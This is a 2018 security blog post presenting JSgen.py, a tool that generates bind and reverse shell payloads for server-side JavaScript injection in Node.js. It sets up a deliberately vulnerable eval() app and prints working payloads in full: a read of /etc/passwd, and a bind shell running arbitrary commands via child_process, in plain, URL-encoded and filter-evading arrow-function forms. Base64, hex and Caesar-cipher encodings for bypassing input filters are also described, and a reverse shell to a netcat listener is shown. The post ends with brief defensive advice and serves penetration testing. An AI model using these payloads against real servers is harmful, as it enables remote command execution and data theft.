<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:1.1rem}</style><title>JSgen.py – bind and reverse shell JS code generator for SSJI in Node.js with filter bypass encodings</title><meta name=description content="I wrote a Python script (JSgen.py) to generate javascript code to be injected in case you find a Server Side Javascript Injection (SSJI). It supports both …"><meta name=keywords content='blog,gokarna,hugo'><meta property="og:url" content="https://0x4ndr3.github.io/posts/jsgen-py-bind-and-reverse-shell-js-code-generator-for-ssji-in-node-js-with-filter-bypass-encodings/"><meta property="og:type" content="website"><meta property="og:title" content="JSgen.py – bind and reverse shell JS code generator for SSJI in Node.js with filter bypass encodings"><meta property="og:description" content="I wrote a Python script (JSgen.py) to generate javascript code to be injected in case you find a Server Side Javascript Injection (SSJI). It supports both …"><meta property="og:image" content="https://0x4ndr3.github.io/posts/jsgen-py-bind-and-reverse-shell-js-code-generator-for-ssji-in-node-js-with-filter-bypass-encodings/images/new-8.png"><meta property="og:image:secure_url" content="https://0x4ndr3.github.io/posts/jsgen-py-bind-and-reverse-shell-js-code-generator-for-ssji-in-node-js-with-filter-bypass-encodings/images/new-8.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="JSgen.py – bind and reverse shell JS code generator for SSJI in Node.js with filter bypass encodings"><meta name=twitter:description content="I wrote a Python script (JSgen.py) to generate javascript code to be injected in case you find a Server Side Javascript Injection (SSJI). It supports both …"><meta property="twitter:domain" content="https://0x4ndr3.github.io/posts/jsgen-py-bind-and-reverse-shell-js-code-generator-for-ssji-in-node-js-with-filter-bypass-encodings/"><meta property="twitter:url" content="https://0x4ndr3.github.io/posts/jsgen-py-bind-and-reverse-shell-js-code-generator-for-ssji-in-node-js-with-filter-bypass-encodings/"><meta name=twitter:image content="https://0x4ndr3.github.io/posts/jsgen-py-bind-and-reverse-shell-js-code-generator-for-ssji-in-node-js-with-filter-bypass-encodings/images/new-8.png"><link rel=canonical href=https://0x4ndr3.github.io/posts/jsgen-py-bind-and-reverse-shell-js-code-generator-for-ssji-in-node-js-with-filter-bypass-encodings/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.fdbfba1e074acb7e4abbf4c94eb19abb7702489c9689a27ee5e24a2bd481e4b7.js integrity="sha256-/b+6HgdKy35Ku/TJTrGau3cCSJyWiaJ+5eJKK9SB5Lc="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://0x4ndr3.github.io/><img src=https://0x4ndr3.github.io/main.png alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://0x4ndr3.github.io/>0x4ndr3</a></div><div class=nav-links><div class=nav-link><a href=https://0x4ndr3.github.io/posts/ aria-label><img class=svg-inject src=/icons/notepadplusplus.svg> Posts</a></div><div class=nav-link><a href=https://github.com/0x4ndr3 aria-label=github target=_blank><img class=svg-inject src=/icons/github.svg> Github</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://0x4ndr3.github.io/posts/><img class=svg-inject src=/icons/notepadplusplus.svg> Posts</a></li><li class=nav-item><a href=https://github.com/0x4ndr3 target=_blank><img class=svg-inject src=/icons/github.svg> Github</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>JSgen.py – bind and reverse shell JS code generator for SSJI in Node.js with filter bypass encodings</h1><small role=doc-subtitle></small><p class=post-date>June 28, 2018</p><ul class=post-tags></ul></div><div class=post-content><p>I wrote a Python script (<a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer">
<span>JSgen.py
</span></a>) to generate javascript code to be injected in case you find a Server Side Javascript Injection (SSJI). It supports both bind and reverse shells, and also two well known encodings – hex and base64 – as well as a third one – caesar’s cipher – to help in bypassing weak filters.</p><p>Before you try it, make sure you have the <a href=http://click.pocoo.org/ target=_blank rel="nofollow noopener noreferrer"><span>click
</span></a>module installed:</p><blockquote><p>$ pip install click</p></blockquote><p><a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span><img src=images/sample1.png alt=sample></span></a></p><hr><p>Just a few years ago, “server side” injections would come down to many languages (i.e. SQL, shellcode, bash/sh, ASP, PHP, etc), but definitely not javascript. So the question is: if you find yourself in a position where you can inject JS code into a server, how do you get shell access and bypass possible filters in place?</p><p>There are already some tutorials out there on how to develop different scripts (some work better than others) and put in your own IP and/or TCP port. But I couldn’t find any way to automate the code generation, and to custom encode the payload to bypass specific filters. Hence, <a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span>JSgen.py
</span></a>.</p><h2 id=eval-function>eval() function</h2><p>For multiple reasons, javascript’s <a href=https://www.w3schools.com/Jsref/jsref_eval.asp target=_blank rel="nofollow noopener noreferrer"><span>eval()
</span></a>function can come in quite handy and therefore it’s used quite often. It’s important to note that, if you’re a programmer/developer, you have some details in terms of how to use eval, that are beyond the scope of this post, as it doesn’t really matter for the purposes of getting a shell. I’m referring to the fact that you should always try to use it in strict mode, and with indirect calls, to restrict its ability to read/write local variables. You can find a very good read on this at <a href=http://2ality.com/2014/01/eval.html target=_blank rel="nofollow noopener noreferrer"><span>http://2ality.com/2014/01/eval.html
</span></a>.</p><h2 id=setting-up-the-lab>Setting up the lab</h2><p>All we need to do here is create two VMs. I used <a href=https://aws.amazon.com/lightsail/ target=_blank rel="nofollow noopener noreferrer">
<span>AWS Lightsail
</span></a>to create two Ubuntu 16.04 systems, in which one of the servers will be used for the reverse shell to connect back to (just listening with a netcat on port 80) and the other one will actually have a very small application in <a href=https://nodejs.org/ target=_blank rel="nofollow noopener noreferrer"><span>Node.js
</span></a>using <a href=https://expressjs.com/ target=_blank rel="nofollow noopener noreferrer"><span>Express
</span></a>module and eval() :</p><blockquote><p>sudo apt -y update
sudo curl -sL <a href=https://deb.nodesource.com/setup_10.x target=_blank rel="nofollow noopener noreferrer"><span>https://deb.nodesource.com/setup_10.x
</span></a>| sudo -E bash –<br>sudo apt -y install nodejs<br>sudo npm install -g express<br>mkdir test<br>cd test<br>sudo npm -y init<br>sudo npm install –save express<br>cat &#171;EOF &#187; main.js<br>var express = require(‘express’);<br>var app = express();<br>app.get(‘/’, function(req, res){<br>var result = eval(req.query.exp)<br>res.send(“Result = ” + result);<br>});<br>app.listen(80);<br>EOF</p></blockquote><p>After that, you can just run the app with:</p><blockquote><p>sudo nodejs main.js # sudo because we’re binding to TCP port 80 (&lt;1024)</p></blockquote><h2 id=discovery-and-information-gathering>Discovery and information gathering</h2><p>The easiest way for you to detect javascript code injection via eval is for you to do some math, as in “2-1”. Don’t fall into the temptation of “1+1” because it won’t work. The reason for that is the “+” in a URL is actually decoded to the space character. So if you really want to do the “1+1”, you should inject “1%2b1”.</p><p><img src=images/01.png alt="Figure 1 – 1+1 example"></p><p>Now just because it’s responding with the result, it doesn’t necessarily mean it’s a javascript injection in Node.js. So to confirm it you can use a global object that provides information on the current Node.js process, called <a href=https://nodejs.org/api/process.html target=_blank rel="nofollow noopener noreferrer"><span>process
</span></a>. This object contains a number of properties and methods that will give us a lot of information regarding the Node.js process and surrounding environment/OS, like the following:</p><ul><li>process.title</li><li>process.argv0</li><li>process.version</li><li>process.argv</li><li>process.arch</li><li>process.cwd()</li><li>process.pid</li><li>process.platform</li><li>process.exit(99) – Warning: it brings down the server with exit code 99.</li></ul><p>Other global variables of interest are:</p><ul><li>__filename</li><li>__dirname</li></ul><p>And you can also require specific modules and call their methods:</p><ul><li>var os = require(‘os’);os.hostname()</li></ul><p><img src=images/02.png alt="Figure 2 – process.title example"></p><p>I’ve put all the above into a file named “list” and ran some bash code to retrieve the data:</p><p><img src=images/03.png alt="Figure 3 – information gathering"></p><p>Knowing that you can call modules means you can pretty much do anything with very little coding. For example, you can read and write – both wherever the user running Node.js has permissions to do so – files in the system. With the following line you can see a read of file /etc/passwd:</p><blockquote><p>require(‘fs’).readFileSync(‘/etc/passwd’)</p></blockquote><p>Now bear in mind that this should be URL encoded to be accepted as we want it to:</p><blockquote><p>require(%27fs%27).readFileSync(%27%2Fetc%2Fpasswd%27)</p></blockquote><p><img src=images/04.png alt="Figure 4 – /etc/passwd display"></p><p>Now, with a bit of <a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span>JS magic
</span></a>, you can bind a shell to a port, or execute a reverse shell, as follows in the next sections.</p><h2 id=bind-shell>Bind shell</h2><p>The point here is to execute javascript that will bind to port 443 and allow us to perform an HTTP GET request with parameter “c” to the same server. This parameter will allow us to execute any command and we’ll have the HTTP response show us the result.</p><p>The code:</p><blockquote><p>(function x(){require(‘http’).createServer(function(req,res){res.writeHead(200,{“Content-Type”:”text/plain”});require(‘child_process’).exec(require(‘url’).parse(req.url,true).query[‘c’],function(e,s,st){res.end(s)})}).listen(<strong>443</strong>)})()</p></blockquote><p>Encoded in URL:</p><blockquote><p>(function%20x()%7Brequire(%27http%27).createServer(function(req%2Cres)%7Bres.writeHead(200%2C%7B%22Content-Type%22%3A%22text%2Fplain%22%7D)%3Brequire(%27child_process%27).exec(require(%27url%27).parse(req.url%2Ctrue).query%5B%27c%27%5D%2Cfunction(e%2Cs%2Cst)%7Bres.end(s)%7D)%7D).listen(443)%7D)()</p></blockquote><p>After sending it to the browser:</p><p><img src=images/05.png alt="Figure 5 – bind shell injection"></p><p>We can then connect to http:// … :443/?c=ps%20aux and we’ll get:</p><p><img src=images/06.png alt="Figure 6 – port 443 c parameter executing"></p><h3 id=filter-evasion>Filter evasion</h3><p>It’s easy for a developer to look at the payloads I’m showing, and assume that a simple “function” string filter, for example, would block any shell execution attempts. So <strong>let’s find a way to code this payload without the “function” string</strong>. I actually found 3 ways to define a function without the word “function” described by <a href=https://twitter.com/ryanflorence target=_blank rel="nofollow noopener noreferrer"><span>Ryan Florence
</span></a>in the blog post <a href=https://medium.com/@ryanflorence/functions-without-function-bc356ed34a2f target=_blank rel="nofollow noopener noreferrer"><span>Functions without “function”
</span></a>, and one of them is called arrow functions and if you’ve developed in Node.js and any of its modules, like Express, you’ll recognise this:</p><blockquote><p>const add = (x, y) => {<br>return x + y<br>}</p></blockquote><p>Inspired by the arrow functions, you can rewrite the bind shell code as:</p><blockquote><p>require(‘http’).createServer((req,res)=>{res.writeHead(200,{“Content-Type”:”text/plain”});require(‘child_process’).exec(require(‘url’).parse(req.url,true).query[‘c’],(e,s,st)=>{res.end(s)})}).listen(443)</p></blockquote><p>URL encoded:</p><blockquote><p>require(%27http%27).createServer((req%2Cres)%3D%3E%7Bres.writeHead(200%2C%7B%22Content-Type%22%3A%22text%2Fplain%22%7D)%3Brequire(%27child_process%27).exec(require(%27url%27).parse(req.url%2Ctrue).query%5B%27c%27%5D%2C(e%2Cs%2Cst)%3D%3E%7Bres.end(s)%7D)%7D).listen(443)</p></blockquote><p>Now, let’s say <strong>you find a more complex filter</strong> that filters a lot of strings (i.e. require, child_process, exec, query, etc). What can you do then? You can actually use standard encodings to hide your code. An example is Base64:</p><p><a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span><img src=images/new-7.png alt="Figure 7 – JSgen.py bind -e base64 -p 443"></span></a></p><p><strong>Another example of standard encoding is hexadecimal</strong>, but I’ll show it in the reverse shell section example ahead.</p><p>So let’s now get into paranoia mode. A scenario in which <strong>all the standard encodings are blocked</strong>, for example by filtering strings such as base64, or hex, or tostring, or buffer. What can we do then?</p><p><strong>You can come up with your own encoding</strong>! Let’s try to implement Caesar’s cipher with k=1. For anyone not familiar with this, it’s basically shifting each character 1 position to the right. For example ‘a’ would become ‘b’, and ‘b’ would become ‘c’. Typically in a caesar’s cipher, the last character ‘z’ would go around and become ‘a’, but not in this example, as the last character is actually ASCII code 255.</p><p>We’ll use <a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span>JSgen.py
</span></a>to generate the payload:</p><p><a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span><img src=images/new-8.png alt="Figure 8 – JSgen.py"></span></a></p><p><a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span><img src=images/081.png alt="Figure 9 – JSgen.py bind -e caesar -k 1"></span></a></p><p>And it works exactly the same as shown in Figure 6.</p><h2 id=reverse-shell>Reverse shell</h2><p><a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span>JSgen.py
</span></a>also generates reverse shell that connects back to a netcat listening server:</p><p><a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span><img src=images/new-10.png alt="Figure 10 – reverse shell generator section in JSgen.py"></span></a></p><p>When executed with the appropriate parameters, it gives you the payload:</p><p><a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span><img src=images/10.png alt="Figure 11 – JSgen.py reverse -e hex -p 80 –ip "></span></a></p><p>And after submitting the payload:</p><p><img src=images/11.png alt="Figure 12 – reverse shell payload submission"></p><p>You get your reverse shell:</p><p><img src=images/12.png alt="Figure 13 – nc -l -p 80"></p><h2 id=recommendations-for-developersprogrammers>Recommendations for developers/programmers</h2><ul><li>Make sure you <strong>trust the source</strong> you’re inputing into the eval function, and always perform validation on that data. If you’re expecting a number, check if it is one. If you’re expecting a city, make the user choose from a dropdown list, and verify it on the server side if it matches one of those in the list;</li><li>Have a firewall <strong>blocking all unused ports</strong> so attackers won’t find closed ports they can bind to. Closed ports usually means the traffic to those ports are going straight to the OS and no firewall is blocking/dropping them in between. So attackers know that if they bind a backdoor on those, they’ll be able to reach it from the outside, which is exactly what we did with the bind shell scenario;</li><li>Have the Node.js process executed by a <strong>low privileged user/account</strong> (i.e. www-data) that only has access to exactly what it needs to do its job, and not root as we had in the lab we set up.</li></ul><hr><p>If you wish to play around with it and test it, you can find the code for JSgen.py <a href=https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py target=_blank rel="nofollow noopener noreferrer"><span>here
</span></a>.</p><p>Thanks for reading!</p></div><div class=prev-next></div><svg id="btt-button" class="arrow-logo" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div></main><footer class=footer><span>&copy; 2018 Andre Lima</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>